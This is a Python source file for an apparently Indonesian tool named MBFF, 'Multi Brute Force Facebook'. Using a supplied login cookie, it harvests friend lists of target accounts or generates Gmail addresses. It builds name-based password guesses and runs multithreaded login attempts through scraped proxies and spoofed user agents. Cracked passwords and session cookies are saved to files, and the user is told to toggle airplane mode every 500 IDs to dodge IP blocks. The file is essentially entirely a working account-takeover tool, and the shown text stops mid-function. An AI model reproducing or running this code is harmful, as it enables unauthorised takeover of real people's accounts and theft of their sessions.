#coding utf-8
#semangat DerXr  kamu pasti bisa
#=======[ FOLLOW MY SOSIAL MEDIA ]========#
#INSTAGRAM : der_xrrr
#FACEBOOK    : Derr
#TWITER          : DerXr_Dev
#============[ IMPORT MODULE ]============#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich.progress import track
from time import sleep
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.console import Console as sol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
dump = []
memek = []
ualu,ualuh = [],[]
#=============[ GLOBAL NAMA ]=============#
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid=[],[],0,0,0,[],[],[],[],[],[]
live,chek=0,0
pwpluss,pwnya=[],[]
ugen=[]
uaku,uadia=[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
ualu,ualuh=[],[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mBrayennnXD')
prox=open('.prox.txt','r').read().splitlines()
sys.stdout.write('\x1b]2; MBFF | DerXr_dev Multi Brute Force Facebook\x07')
#==============[ CLEAR LAYAR ]=============#
def clear_layar():
	try:os.system('clear')
	except:pass
#============[ GLOBAL KEMBALI ]============#
def back():
	login()
#================[ ANIMASI ]================#
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.5)
#================[ TANGGAL ]===============#
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tanggal = datetime.datetime.now().day
bulan = dic[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
okc = 'OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
cpc = 'CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
#===============[ GET TAHUN ]==============#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009','61550']:tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
#================[ WARNA ]=================#
HM = '\x1b[1;92m' #===> HIJAU MUDA
HT = '\033[32m'     #===> HIJAU TUA
KM = '\033[93m'    #===> KUNING MUDA
KT = '\033[33m'     #===> KUNING TUA
BM = '\x1b[0;34m' #===> BIRU MUDA
BT = '\33[1;96m'    #===> BIRU TUA
MM = '\x1b[1;91m'#===> MERAH MUDA
UM = '\033[95m'    #===> UNGU MUDA
P = '\x1b[1;97m'     #===> PUTIH
n = '\33[m'               #===> DEFAULT
xr_dev = random.choice([HM,KM,BM,MM,UM,P])
#==============[ GET PROXY ]===============#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('Connection error')
prox=open('.prox.txt','r').read().splitlines()
#==============[ USER AGENT ]===============#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
    g2 = random.choice(["X676B","X687","X609","X697","X680D","X507","X605","X668","X6815B","X624", "X655F","X689C","X608","X698","X682B","X682C","X688C", "X688B","X658E","X659B","X689B","X689","X689D","X662","X662B","X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C","X6816","X6816D","X668C","X665B","X665E", "X510","X559C","X559F","X559","X606","X606C","X606D"])
    u1 = f"Mozilla/5.0 (Linux; U; Android 8.0.0; en-us; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 PHX/10.0"
    u2 = f"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; U; Android 7.0; fr-fr; Infinix X559C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 PHX/9.3"
    u4 = f"Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.11.3.1204 Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"
    UaMainn = random.choice([u1, u2, u3, u4, u5])
    ugen.append(UaMainn)
#===============[ BANNNER ]================#
def banner():
	cetak(panel(f'''
MM    MM BBBBB   FFFFFFF FFFFFFF 
MMM  MMM BB   B  FF      FF    [bold white]|| User : [bold green]DerXr_dev[bold white]
MM MM MM BBBBBB  FFFF    FFFF  [bold white]|| Name : [bold green]MBFF[bold white]
MM    MM BB   BB FF      FF    [bold white]|| real : [bold green]27-09-2023[bold white]
MM    MM BBBBBB  FF      FF    [bold white]|| Stat : [bold green]uji coba[bold white] ''', width=70, padding=(0,6), style=f"bold bold white ")) 
#==============[ CEK COOKIE ]===============#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.coki.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_back()
		except requests.exceptions.ConnectionError:
			print('ConnectionError')
			exit()
	except IOError:
		login_back()
#==============[ LOGIN COOKIE ]===============#
def login_back():
	try:
		clear_layar() 
		banner()
		cetak(panel('[bold green]warning harap masukan cookie kamu untuk login ke dalam scrif MBFF derxr',width=70,style='bold white'))
		cok = input('[+] masukan cookie : ')
		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat  = {}
		raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']; pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.coki.txt','w').write(cok); masuk = input('\n[+] tekan enter'); os.system('clear'); login()
	except Exception as e:
		print(e)
#==============[ BAGIAN MENU ]===============#
def menu(nama,id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.coki.txt','r').read()
	except IOError:
		print('Cookies telah kedaluwarsa ')
		time.sleep(5)
		login_back()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(panel('[bold green]atas apapun yang terjadi admin tidak akan bertanggung jawab',width=70, padding=(0,3), title="perhatian", style='bold white'))
	urutan = []
	urutan.append(panel(f"     [bold green]{nama}[/]",width=34, padding=(0,6), title=f"username", style=f"bold bold white")) 
	urutan.append(panel(f"     [bold green]{id}[/]",width=35, padding=(0,5), title=f"user id", style=f"bold bold white")) 
	urutan.append(panel(f"[bold green]01[bold white].crack publik\n[bold green]02[bold white].crack massal\n[bold green]03[bold white].crack email\n[bold green]04[bold white].crack file",width=34, padding=(0,5), title=f"menu crack", style=f"bold bold white")) 
	urutan.append(panel(f"[bold green]05[bold white].cek hasil crack\n[bold green]06[bold white].cek login hasil cp\n[bold green]07[bold white].delete cookie\n[bold green]08[bold white].keluar",width=35, padding=(0,5), title=f"menu cek", style=f"bold bold white")) 
	wa.print(Columns(urutan)) 
	xr_dev_ganteng_pisan = input('[%] input 1/6 : ')
	if xr_dev_ganteng_pisan in ['1','01']:
		crack_publik()
	elif xr_dev_ganteng_pisan in ['2','02']:
		crack_massal()
	elif xr_dev_ganteng_pisan in ['3','03']:
		crack_email() 
	elif xr_dev_ganteng_pisan in ['4','04']:
		cek_ressult_akun() 
	elif xr_dev_ganteng_pisan in ['5','05']:
		cp_detector() 
	elif xr_dev_ganteng_pisan in ['6','06']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('Berhasil keluar && delete cookie')
		exit()
	else:
		print('input pilihan yang benar ')
		back()
#==============[ CRACK PUBLIK ]================#
def crack_publik():
        with requests.Session() as ses:
                token = open('.token.txt','r').read()
                cok = open('.coki.txt','r').read()
                cetak(panel('[bold green]masukan id target bersifat publik dan bukan private',width=70,padding=(0,8), title="pemberitahuan", style='bold white'))
                a = input(f'[%] input id target : ')
                try:
                        params = {
                        "access_token": token,
                        "fields": "name,friends.fields(id,name,birthday)"
                        }
                        b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
                        for c in b["friends"]["data"]:
                                id.append(c["id"]+"|"+c["name"])
                        print('[%] total id target : {}'.format(len(id)));atur_atur()
                except Exception as e:
                        print(e)
#=============[ CRACK MASSAL ]===============#
def crack_massal():    
	try:
		token = open('.token.txt','r').read()
		cok = open('.coki.txt','r').read()
	except IOError:
	    print(f"cookie invalid")
	    exit()           
	try:
		cetak(panel('[bold green]masukan id target bersifat publik dan bukan private',width=70,padding=(0,8), title="pemberitahuan", style='bold white'))
		jumlah = int(input(f'\n[%] mau berapa id target : '))
	except ValueError:
	    exit()
	if jumlah<1 or jumlah>1000:
	    exit()
	ses=requests.Session()
	angka = 0
	for KOTG49H in range(jumlah):
		angka+=1
		xrganteng = input(f'[%] input id target ke '+str(angka)+f' : ')
		uid.append(xrganteng)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        print(f"connection error")
	        exit()
	try:
	      print(f'[%] total id yang berhasil terkumpul {hh}'+str(len(id)))
	      setting()
	except requests.exceptions.ConnectionError:
	    print(f"connection error")
	    exit()
	except (KeyError,IOError):
		print("pertemanan tidak publik atai private")
		exit()
#=============[ CRACK EMAIL ]===============#
def crack_email():
	rc = random.choice
	rr = random.randint
	bas = ['nazri','nizar','reni','alan','aidil','kunyuk','bocil','lusi','alam','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['boy','mabok','eam','aulia','kasih','cantik','bocil','ganz','cans','kasep','ganteng','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	cetak(panel('[bold green]masukan nama bebas terserah apa yang kalian mau',width=70, padding=(0,8), title="pemberitahuan", style='bold white'))
	nama = input(f'[%] input nama  : ')
	if ',' in str(nama):
		exit(f'masukan 1 nama saja')
	doma = '@gmail.com'
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'masukan domain yang benar')
	jumlah = input(f'[%] input total : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(id)==1010101010101010101:atur_atur()
	atur_atur()
#=============[ ATUR-ATUR ]===============#
def atur_atur():
	cetak(panel(f"[bold green]01[bold white].crack dari urutan id old\n[bold green]02[bold white].crack dari urutan id new\n[bold green]03[bold white].crack dari urutan id random", width=70, padding=(0,18), style=f"bold white")) 
	xr_dev_baik = input('[%] input 1/3 : ')
	if xr_dev_baik in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif xr_dev_baik in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif xr_dev_baik in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('input pilihan yang benar')
		exit()
	urutan = []
	urutan.append(panel(f"[bold green]01[bold white].m.facebook.com\n[bold green]02[bold white].mbasic.facebook.com\n[bold green]03[bold white].free.facebook.com",width=34, padding=(0,5), title=f"validate", style=f"bold white")) 
	urutan.append(panel(f"[bold green]04[bold white].m.facebook.com\n[bold green]05[bold white].mbasic.faceboom.com\n[bold green]06[bold white].mtouch.facebook.com",width=35, padding=(0,5), title=f"async", style=f"bold white")) 
	wa.print(Columns(urutan)) 
	der_xr_dev_ganteng = input('[%] input 1/6 : ')
	if der_xr_dev_ganteng in ['1','01']:
		method.append('mobile_date')
	elif der_xr_dev_ganteng in ['2','02']:
		method.append('mbasic_date')
	elif der_xr_dev_ganteng in ['3','03']:
		method.append('free_date')
	elif der_xr_dev_ganteng in ['4','04']:
		method.append('mobile_sync')
	elif der_xr_dev_ganteng in ['5','05']:
		method.append('mbasic_sync')
	elif der_xr_dev_ganteng in ['6','06']:
		method.append('mtouch_sync')
	else:
		method.append('mobile_date')
	cetak(panel('[bold white]Tampilkan aplikasi terkait',width=70, padding=(0,20), style='bold white'))
	der_xr_ganteng_syekali = input('[%] input y/t : ')
	if der_xr_ganteng_syekali in ['']:
		print('input pilihan yang benar')
		back()
	elif der_xr_ganteng_syekali in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	cetak(panel('[bold white]Tambahkan password manual',width=70, padding=(0,20), style='bold white'))
	pwplus=input('[%] input y/t : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(panel('[bold white]masukan password tambahan minimal 6 karakter ',width=70, padding=(0,12), title="pemberitahuan", style='bold white'))
		pwku=input(f'[%] password  : {HM}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwordd()
#===========[ BAGIAN PASSWORD ]=============#
def passwordd():
	global prog,des
	cetak(panel('[bold white]result ok/cp otomatis tersimpan ke dalam folder atau file ',width=70, padding=(0,5), title="pemberitahuan", style='bold white'))
	urutan = []
	urutan.append(panel(f"[bold green]{okc}[/]",width=34, padding=(0,5), style=f"bold bold white")) 
	urutan.append(panel(f"[bold yellow]{cpc}[/]",width=35, padding=(0,5), style=f"bold bold white")) 
	wa.print(Columns(urutan)) 
	cetak(panel('[bold white]mainkan mode pesawat setiap [bold green]500[bold white] id agar terhindar dari spam ip',width=70, padding=(0,3), title="pemberitahuan", style='bold white'))
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['sayank','sayang123','memekk','kamunanya','bangsat','anjing','katasandi','jancok']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile_date' in method:
					pool.submit(crack_mobile_date,idf,pwv)
				elif 'mbasic_date' in method:
					pool.submit(crack_mbasic_date,idf,pwv)
				elif 'free_date' in method:
					pool.submit(crack_free_date,idf,pwv)
				elif 'mobile_sync' in method:
					pool.submit(crack_mobile_sync,idf,pwv)
				elif 'mbasic._sync' in method:
					pool.submit(crack_mbasic_sync,idf,pwv)
				elif 'mtouch_sync' in method:
					pool.submit(crack_mtouch_sync,idf,pwv)
				else:
					pool.submit(crack_mtouch_sync,idf,pwv)
	print(f'[*] succes crack dengan hasil ok:{HM}%s{n} akun dan hasil cp:{KM}%s{n} akun'%(ok,cp))
#=============[ VALIDATE ]===============#
def crack_mobile_date(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[%] validate_mobile die:-{loop} ok:-[bold green]{ok}[/] cp:-[bold yellow]{cp}[/] total:-{len(id)}")
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=139274246138520&kid_directed_site=0&app_id=139274246138520&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fclient_id%3D139274246138520%26state%3D0fb7c2cc4302f2daa404c65740d72a07%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fmember.seagm.com%252Fsns%252Ffacebook%252Fcallback%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5907c287-a286-4645-9540-871306447d6a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmember.seagm.com%2Fsns%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0fb7c2cc4302f2daa404c65740d72a07%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&zero_e=3&zero_et=1697291544&_rdc=1&_rdr&wtsid=rdr_0V2YqdJRkSKKWMunz')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v9.0/dialog/oauth?client_id=139274246138520&state=0fb7c2cc4302f2daa404c65740d72a07&response_type=code&sdk=php-sdk-5.7.0&redirect_uri=https%3A%2F%2Fmember.seagm.com%2Fsns%2Ffacebook%2Fcallback&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=5907c287-a286-4645-9540-871306447d6a&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=139274246138520&kid_directed_site=0&app_id=139274246138520&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fclient_id%3D139274246138520%26state%3D0fb7c2cc4302f2daa404c65740d72a07%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fmember.seagm.com%252Fsns%252Ffacebook%252Fcallback%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5907c287-a286-4645-9540-871306447d6a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmember.seagm.com%2Fsns%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0fb7c2cc4302f2daa404c65740d72a07%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&zero_e=3&zero_et=1697291544&_rdc=1&_rdr&wtsid=rdr_0V2YqdJRkSKKWMunz','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[bold yellow]{cpc}")
				tree.add(f"[bold yellow]Tahun akun {tahun(idf)}")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]Tahun akun {tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{n}[{Hm}{nok}{n}] {B}{muncul[0]} {muncul[1]}{n}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{n}[{KM}{hit}{n}] {M}{muncul[0]} {muncul[1]}{n}\n")
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]Tahun akun {tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}|{kuki}").add(f"[bold green]{infoakun}\n") 
					cetak(tree) 
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#=============[ VALIDATE ]===============#
def crack_mbasic_date(idf,pwv):
	global loop,ok,cp
	bo = random.choice([HM,KM,BM])
	prog.update(des,description=f"[%] validate_free die:-{loop} ok:-[bold green]{ok}[/] cp:-[bold yellow]{cp}[/] total:-{len(id)}")
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+random.choice(nip)}
			ses.headers.update({"Host": "free.facebook.com","upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
